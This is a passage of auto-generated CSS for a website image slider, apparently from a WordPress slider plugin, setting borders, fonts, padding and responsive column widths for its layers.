.n-uc-10e6a17eed4ba-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-10e6a17eed4ba-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-12e7e99597a66-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-12e7e99597a66-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-12895d9ec26d5-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-12895d9ec26d5-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-12e2bf9249b47-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-12e2bf9249b47-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1e4f62ee275eb-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1e4f62ee275eb-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-14d95d0f89983-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-14d95d0f89983-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n2-font-9165920ec0621fd9178cb884bd6c33f6-hover{font-family: 'Roboto','Arial';color: #81898d;font-size:162.5%;text-shadow: none;line-height: 1.5;font-weight: normal;font-style: normal;text-decoration: none;text-align: center;letter-spacing: normal;word-spacing: normal;text-transform: none;font-weight: 400;}div#n2-ss-4 .n-uc-1d85941085228-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1d85941085228-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-187556ec187db-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-187556ec187db-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-14895dd839786-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-14895dd839786-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1af032d147d2d-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1af032d147d2d-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1d95b9f87f689-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1d95b9f87f689-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-12370427bf092-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-12370427bf092-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n2-font-e9fe327db9886930c0a1d79074493d25-hover{font-family: 'Roboto','Arial';color: #81898d;font-size:175%;text-shadow: none;line-height: 1.5;font-weight: normal;font-style: normal;text-decoration: none;text-align: center;letter-spacing: normal;word-spacing: normal;text-transform: none;font-weight: 400;}div#n2-ss-4 .n-uc-110158b2af952-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-110158b2af952-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-139d094292238-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-139d094292238-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-10f5f2037ea6a-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-10f5f2037ea6a-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1128283a68263-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1128283a68263-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-106289ccb07b2-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-106289ccb07b2-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-15c84fcd75e98-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-15c84fcd75e98-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-19e7322032fd9-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-19e7322032fd9-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1310a1e1216d1-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1310a1e1216d1-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1daeacbd4ec53-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1daeacbd4ec53-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1962251824ae2-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1962251824ae2-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1d5482854f375-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1d5482854f375-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n2-font-dc14667aa2824b2ed9556c5d8685c4b0-hover{font-family: 'Roboto','Arial';color: #81898d;font-size:150%;text-shadow: none;line-height: 1.5;font-weight: normal;font-style: normal;text-decoration: none;text-align: left;letter-spacing: normal;word-spacing: normal;text-transform: none;font-weight: 400;}div#n2-ss-4 .n-uc-1824f2300d924-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1824f2300d924-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-16d86ee31826a-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-16d86ee31826a-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1b0dafc671f80-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1b0dafc671f80-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1fe3733430bc9-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1fe3733430bc9-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1ab5a9a53912a-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1ab5a9a53912a-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1381b0f95e42b-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1381b0f95e42b-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n2-font-72aa918aeca0060b6954c82eef2c6e78-hover{font-family: 'Roboto','Arial';color: #81898d;font-size:200%;text-shadow: none;line-height: 1.5;font-weight: normal;font-style: normal;text-decoration: none;text-align: left;letter-spacing: normal;word-spacing: normal;text-transform: none;font-weight: 400;}div#n2-ss-4 .n-uc-1ba8941ee4ddf-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1ba8941ee4ddf-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-13a465b66c0a8-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-13a465b66c0a8-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-18baf78d0d284-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-18baf78d0d284-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-102893308dcc5-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-102893308dcc5-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n2-style-785355f374be86c332d4665aae819858-dot{background: RGBA(0,0,0,0.67);opacity:1;padding:5px 5px 5px 5px ;box-shadow: none;border: 0px solid RGBA(0,0,0,1);border-radius:50px;margin:4px;}div#n2-ss-4 .n2-style-785355f374be86c332d4665aae819858-dot.n2-active, div#n2-ss-4 .n2-style-785355f374be86c332d4665aae819858-dot:HOVER, div#n2-ss-4 .n2-style-785355f374be86c332d4665aae819858-dot:FOCUS{background: RGBA(29,129,249,1);}div#n2-ss-4 .n2-ss-slide-limiter{max-width:1000px;}div#n2-ss-4 .n-uc-PF8aDioiewiY{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-9lRTWziHHVBY-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-9lRTWziHHVBY{align-self:center;}div#n2-ss-4 .n-uc-1410e5465e7c1-inner{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-1410e5465e7c1-inner > .n2-ss-layer-row-inner{width:calc(100% + 21px);margin:-10px;flex-wrap:nowrap;}div#n2-ss-4 .n-uc-1410e5465e7c1-inner > .n2-ss-layer-row-inner > .n2-ss-layer[data-sstype="col"]{margin:10px}div#n2-ss-4 .n-uc-171ef7a6f1f14-inner{padding:10px 10px 10px 10px;text-align:left;--ssselfalign:var(--ss-fs);;justify-content:center}div#n2-ss-4 .n-uc-171ef7a6f1f14{max-width: 300px;width:50%}div#n2-ss-4 .n-uc-iUkbhf6f0TQE{max-width:245px}div#n2-ss-4 .n-uc-10212f7445602-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-10212f7445602{width:50%}div#n2-ss-4 .n-uc-1165d11049606-inner{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-1165d11049606-inner > .n2-ss-layer-row-inner{width:calc(100% + 21px);margin:-10px;flex-wrap:nowrap;}div#n2-ss-4 .n-uc-1165d11049606-inner > .n2-ss-layer-row-inner > .n2-ss-layer[data-sstype="col"]{margin:10px}div#n2-ss-4 .n-uc-1c9d168d55b36-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-1c9d168d55b36{max-width: 80px;width:33.3%}div#n2-ss-4 .n-uc-1c8e61e4d1395-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-1c8e61e4d1395{width:33.3%}div#n2-ss-4 .n-uc-15cf046786c16-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-15cf046786c16{width:33.3%}div#n2-ss-4 .n-uc-CufBOUa33bx9{--margin-left:5px}div#n2-ss-4 .n-uc-bSRrEp9EMf51{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-TM527udtdpS6-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-TM527udtdpS6{align-self:center;}div#n2-ss-4 .n-uc-1411de2cd2d0b-inner{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-1411de2cd2d0b-inner > .n2-ss-layer-row-inner{width:calc(100% + 21px);margin:-10px;flex-wrap:nowrap;}div#n2-ss-4 .n-uc-1411de2cd2d0b-inner > .n2-ss-layer-row-inner > .n2-ss-layer[data-sstype="col"]{margin:10px}div#n2-ss-4 .n-uc-18827cad0be62-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-18827cad0be62{width:33.3%}div#n2-ss-4 .n-uc-1afacbe1860d5-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-1afacbe1860d5{width:33.3%}div#n2-ss-4 .n-uc-1169d969d1748-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-1169d969d1748{width:33.3%}div#n2-ss-4 .n-uc-fanh1Vrwlggp{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-38BKnei4mCfk-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-38BKnei4mCfk{align-self:center;}div#n2-ss-4 .n-uc-13f534e3e8fa1-inner{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-13f534e3e8fa1-inner > .n2-ss-layer-row-inner{width:calc(100% + 21px);margin:-10px;flex-wrap:nowrap;}div#n2-ss-4 .n-uc-13f534e3e8fa1-inner > .n2-ss-layer-row-inner > .n2-ss-layer[data-sstype="col"]{margin:10px}div#n2-ss-4 .n-uc-10e6a17eed4ba-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-10e6a17eed4ba{width:25%}div#n2-ss-4 .n-uc-12e7e99597a66-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-12e7e99597a66{max-width: 265px;width:25%}div#n2-ss-4 .n-uc-45y3YYujjfnW{max-width:185px}div#n2-ss-4 .n-uc-12895d9ec26d5-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-12895d9ec26d5{max-width: 250px;width:25%}div#n2-ss-4 .n-uc-TbTa8SjGY5UT{max-width:210px}div#n2-ss-4 .n-uc-12e2bf9249b47-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-12e2bf9249b47{width:25%}div#n2-ss-4 .n-uc-PUBWL4PqeOsp{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-r6rhHCdxV9gk-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-r6rhHCdxV9gk{align-self:center;}div#n2-ss-4 .n-uc-1e4f62ee275eb-inner{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-1e4f62ee275eb-inner > .n2-ss-layer-row-inner{width:calc(100% + 21px);margin:-10px;flex-wrap:nowrap;}div#n2-ss-4 .n-uc-1e4f62ee275eb-inner > .n2-ss-layer-row-inner > .n2-ss-layer[data-sstype="col"]{margin:10px}div#n2-ss-4 .n-uc-14d95d0f89983-inner{padding:10px 10px 10px 10px;text-align:left;--ssselfalign:var(--ss-fs);;justify-content:center}div#n2-ss-4 .n-uc-14d95d0f89983{max-width: 255px;width:50%}div#n2-ss-4 .n-uc-fEFRjhnfHgIn{max-width:220px}div#n2-ss-4 .n-uc-1d85941085228-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-1d85941085228{width:50%}div#n2-ss-4 .n-uc-187556ec187db-inner{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-187556ec187db-inner > .n2-ss-layer-row-inner{width:calc(100% + 21px);margin:-10px;flex-wrap:nowrap;}div#n2-ss-4 .n-uc-187556ec187db-inner > .n2-ss-layer-row-inner > .n2-ss-layer[data-sstype="col"]{margin:10px}div#n2-ss-4 .n-uc-14895dd839786-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-14895dd839786{width:50%}div#n2-ss-4 .n-uc-1af032d147d2d-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-1af032d147d2d{width:50%}div#n2-ss-4 .n-uc-OkkIihPeBDiG{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-XRaxAb9yLY3h-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-XRaxAb9yLY3h{align-self:center;}div#n2-ss-4 .n-uc-1d95b9f87f689-inner{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-1d95b9f87f689-inner > .n2-ss-layer-row-inner{width:calc(100% + 21px);margin:-10px;flex-wrap:nowrap;}div#n2-ss-4 .n-uc-1d95b9f87f689-inner > .n2-ss-layer-row-inner > .n2-ss-layer[data-sstype="col"]{margin:10px}div#n2-ss-4 .n-uc-12370427bf092-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-12370427bf092{max-width: 320px;width:40.9%}div#n2-ss-4 .n-uc-PUGOqsWwYo0y{max-width:270px}div#n2-ss-4 .n-uc-110158b2af952-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-110158b2af952{max-width: 180px;width:25.6%}div#n2-ss-4 .n-uc-139d094292238-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-139d094292238{width:33.3%}div#n2-ss-4 .n-uc-IPQY9SagwNag{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-EF8rKSumDzbh-inner{padding:10px 10px 0px 10px;justify-content:center}div#n2-ss-4 .n-uc-EF8rKSumDzbh{align-self:center;}div#n2-ss-4 .n-uc-10f5f2037ea6a-inner{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-10f5f2037ea6a-inner > .n2-ss-layer-row-inner{width:calc(100% + 21px);margin:-10px;flex-wrap:nowrap;}div#n2-ss-4 .n-uc-10f5f2037ea6a-inner > .n2-ss-layer-row-inner > .n2-ss-layer[data-sstype="col"]{margin:10px}div#n2-ss-4 .n-uc-1128283a68263-inner{padding:10px 5px 10px 10px;text-align:left;--ssselfalign:var(--ss-fs);;justify-content:center}div#n2-ss-4 .n-uc-1128283a68263{max-width: 250px;width:50%}div#n2-ss-4 .n-uc-5r8SGxz2UZfk{max-width:230px}div#n2-ss-4 .n-uc-106289ccb07b2-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-106289ccb07b2{width:50%}div#n2-ss-4 .n-uc-15c84fcd75e98-inner{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-15c84fcd75e98-inner > .n2-ss-layer-row-inner{width:calc(100% + 21px);margin:-10px;flex-wrap:nowrap;}div#n2-ss-4 .n-uc-15c84fcd75e98-inner > .n2-ss-layer-row-inner > .n2-ss-layer[data-sstype="col"]{margin:10px}div#n2-ss-4 .n-uc-19e7322032fd9-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-19e7322032fd9{width:33.3%}div#n2-ss-4 .n-uc-1310a1e1216d1-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-1310a1e1216d1{width:33.3%}div#n2-ss-4 .n-uc-1daeacbd4ec53-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-1daeacbd4ec53{width:33.3%}div#n2-ss-4 .n-uc-Z7uvY9zkvkZH{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-AoiuoObDJ6oo-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-AoiuoObDJ6oo{align-self:center;}div#n2-ss-4 .n-uc-1962251824ae2-inner{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-1962251824ae2-inner > .n2-ss-layer-row-inner{width:calc(100% + 21px);margin:-10px;flex-wrap:nowrap;}div#n2-ss-4 .n-uc-1962251824ae2-inner > .n2-ss-layer-row-inner > .n2-ss-layer[data-sstype="col"]{margin:10px}div#n2-ss-4 .n-uc-1d5482854f375-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-1d5482854f375{max-width: 405px;width:50%}div#n2-ss-4 .n-uc-fNHMUUMkQgcm{max-width:385px}div#n2-ss-4 .n-uc-1824f2300d924-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-1824f2300d924{width:50%}div#n2-ss-4 .n-uc-16d86ee31826a-inner{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-16d86ee31826a-inner > .n2-ss-layer-row-inner{width:calc(100% + 21px);margin:-10px;flex-wrap:nowrap;}div#n2-ss-4 .n-uc-16d86ee31826a-inner > .n2-ss-layer-row-inner > .n2-ss-layer[data-sstype="col"]{margin:10px}div#n2-ss-4 .n-uc-1b0dafc671f80-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-1b0dafc671f80{max-width: 100px;width:50%}div#n2-ss-4 .n-uc-1fe3733430bc9-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-1fe3733430bc9{width:50%}div#n2-ss-4 .n-uc-zKnn1FJbuJBc{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-uHbV7hXEZMT1-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-uHbV7hXEZMT1{align-self:center;}div#n2-ss-4 .n-uc-1ab5a9a53912a-inner{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-1ab5a9a53912a-inner > .n2-ss-layer-row-inner{width:calc(100% + 21px);margin:-10px;flex-wrap:nowrap;}div#n2-ss-4 .n-uc-1ab5a9a53912a-inner > .n2-ss-layer-row-inner > .n2-ss-layer[data-sstype="col"]{margin:10px}div#n2-ss-4 .n-uc-1381b0f95e42b-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-1381b0f95e42b{max-width: 325px;width:50%}div#n2-ss-4 .n-uc-nHXLRly593S7{max-width:280px}div#n2-ss-4 .n-uc-1ba8941ee4ddf-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-1ba8941ee4ddf{width:50%}div#n2-ss-4 .n-uc-13a465b66c0a8-inner{padding:10px 10px 10px 10px}div#n2-ss-4 .n-uc-13a465b66c0a8-inner > .n2-ss-layer-row-inner{width:calc(100% + 21px);margin:-10px;flex-wrap:nowrap;}div#n2-ss-4 .n-uc-13a465b66c0a8-inner > .n2-ss-layer-row-inner > .n2-ss-layer[data-sstype="col"]{margin:10px}div#n2-ss-4 .n-uc-18baf78d0d284-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-18baf78d0d284{max-width: 200px;width:50%}div#n2-ss-4 .n-uc-102893308dcc5-inner{padding:10px 10px 10px 10px;justify-content:center}div#n2-ss-4 .n-uc-102893308dcc5{width:50%}div#n2-ss-4 .nextend-arrow img{width: 32px}@media (min-width: 1200px){div#n2-ss-4 [data-hide-desktopportrait="1"]{display: none !important;}}@media (orientation: landscape) and (max-width: 1199px) and (min-width: 901px),(orientation: portrait) and (max-width: 1199px) and (min-width: 701px){div#n2-ss-4 .n-uc-1410e5465e7c1-inner > .n2-ss-layer-row-inner{flex-wrap:nowrap;}div#n2-ss-4 .n-uc-171ef7a6f1f14-inner{padding:10px 5px 10px 10px}div#n2-ss-4 .n-uc-171ef7a6f1f14{max-width: 200px;width:50%}div#n2-ss-4 .n-uc-iUkbhf6f0TQE{max-width:135px}div#n2-ss-4 .n-uc-10212f7445602{width:50%}div#n2-ss-4 .n-uc-1165d11049606-inner > .n2-ss-layer-row-inner{flex-wrap:nowrap;}div#n2-ss-4 .n-uc-1c9d168d55b36{max-width: 50px;width:33.3%}div#n2-ss-4 .n-uc-1c8e61e4d1395{width:33.3%}div#n2-ss-4 .n-uc-15cf046786c16{width:33.3%}div#n2-ss-4 .n-uc-1411de2cd2d0b-inner > .n2-ss-layer-row-inner{flex-wrap:nowrap;}div#n2-ss-4 .n-uc-18827cad0be62{width:33.3%}div#n2-ss-4 .n-uc-1afacbe1860d5{width:33.3%}div#n2-ss-4 .n-uc-1169d969d1748{width:33.3%}div#n2-ss-4 .n-uc-13f534e3e8fa1-inner > .n2-ss-layer-row-inner{flex-wrap:nowrap;}div#n2-ss-4 .n-uc-10e6a17eed4ba{width:25%}div#n2-ss-4 .n-uc-12e7e99597a66{width:25%}div#n2-ss-4 .n-uc-12895d9ec26d5{width:25%}div#n2-ss-4 .n-uc-12e2bf9249b47{width:25%}div#n2-ss-4 .n-uc-1e4f62ee275eb-inner > .n2-ss-layer-row-inner{flex-wrap:nowrap;}div#n2-ss-4 .n-uc-14d95d0f89983{max-width: 205px;width:50%}div#n2-ss-4 .n-uc-fEFRjhnfHgIn{max-width:180px}div#n2-ss-4 .n-uc-1d85941085228{width:50%}div#n2-ss-4 .n-uc-187556ec187db-inner > .n2-ss-layer-row-inner{flex-wrap:nowrap;}div#n2-ss-4 .n-uc-14895dd839786{width:50%}div#n2-ss-4 .n-uc-1af032d147d2d{width:50%}div#n2-ss-4 .n-uc-1d95b9f87f689-inner > .n2-ss-layer-row-inner{flex-wrap:nowrap;}div#n2-ss-4 .n-uc-12370427bf092{max-width: 280px;width:40.9%}div#n2-ss-4 .n-uc-PUGOqsWwYo0y{max-width:none}div#n2-ss-4 .n-uc-110158b2af952{max-width: 80px;width:25.6%}div#n2-ss-4 .n-uc-139d094292238{width:33.3%}div#n2-ss-4 .n-uc-10f5f2037ea6a-inner > .n2-ss-layer-row-inner{flex-wrap:nowrap;}div#n2-ss-4 .n-uc-1128283a68263{max-width: 210px;width:50%}div#n2-ss-4 .n-uc-5r8SGxz2UZfk{max-width:185px}div#n2-ss-4 .n-uc-106289ccb07b2{width:50%}div#n2-ss-4 .n-uc-15c84fcd75e98-inner > .n2-ss-layer-row-inner{flex-wrap:nowrap;}div#n2-ss-4 .n-uc-19e7322032fd9{width:33.3%}div#n2-ss-4 .n-uc-1310a1e1216d1{width:33.3%}div#n2-ss-4 .n-uc-1daeacbd4ec53{width:33.3%}div#n2-ss-4 .n-uc-1962251824ae2-inner > .n2-ss-layer-row-inner{flex-wrap:nowrap;}div#n2-ss-4 .n-uc-1d5482854f375{max-width: 265px;width:50%}div#n2-ss-4 .n-uc-fNHMUUMkQgcm{max-width:235px}div#n2-ss-4 .n-uc-1824f2300d924{width:50%}div#n2-ss-4 .n-uc-16d86ee31826a-inner > .n2-ss-layer-row-inner{flex-wrap:nowrap;}div#n2-ss-4 .n-uc-1b0dafc671f80{max-width: 60px;width:50%}div#n2-ss-4 .n-uc-1fe3733430bc9{width:50%}div#n2-ss-4 .n-uc-1ab5a9a53912a-inner > .n2-ss-layer-row-inner{flex-wrap:nowrap;}div#n2-ss-4 .n-uc-1381b0f95e42b{max-width: 285px;width:50%}div#n2-ss-4 .n-uc-nHXLRly593S7{max-width:235px}div#n2-ss-4 .n-uc-1ba8941ee4ddf{width:50%}div#n2-ss-4 .n-uc-13a465b66c0a8-inner > .n2-ss-layer-row-inner{flex-wrap:nowrap;}div#n2-ss-4 .n-uc-18baf78d0d284{max-width: 70px;width:50%}div#n2-ss-4 .n-uc-102893308dcc5{width:50%}div#n2-ss-4 [data-hide-tabletportrait="1"]{display: none !important;}}@media (orientation: landscape) and (max-width: 900px),(orientation: portrait) and (max-width: 700px){div#n2-ss-4 .n-uc-1410e5465e7c1-inner > .n2-ss-layer-row-inner{flex-wrap:wrap;}div#n2-ss-4 .n-uc-171ef7a6f1f14{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-10212f7445602{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-1165d11049606-inner > .n2-ss-layer-row-inner{flex-wrap:wrap;}div#n2-ss-4 .n-uc-1c9d168d55b36{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-1c8e61e4d1395{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-15cf046786c16{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-1411de2cd2d0b-inner > .n2-ss-layer-row-inner{flex-wrap:wrap;}div#n2-ss-4 .n-uc-18827cad0be62{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-1afacbe1860d5{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-1169d969d1748{width:calc(100% - 20px)}div#n2-ss-4 